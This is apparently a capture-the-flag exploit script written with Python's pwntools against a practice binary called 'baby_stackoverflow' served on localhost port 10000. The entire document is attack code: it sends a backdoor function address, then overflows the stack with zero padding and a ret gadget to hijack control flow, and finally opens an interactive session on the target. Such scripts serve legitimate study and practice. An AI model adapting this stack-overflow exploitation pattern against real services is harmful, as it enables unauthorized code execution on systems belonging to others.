from pwn import *
context.log_level = 'debug'
# p = process('./baby_stackoverflow')
p = remote('127.0.0.1',10000)

backdoor = 0x00000000004006b6
ret = 0x400752

payload = p64(backdoor)
p.sendafter('leave some message??\n',payload)

payload = p64(0)*3 + p64(ret)
p.sendafter('vulnerable? so what?? come to pwn me!!\n',payload)

p.interactive()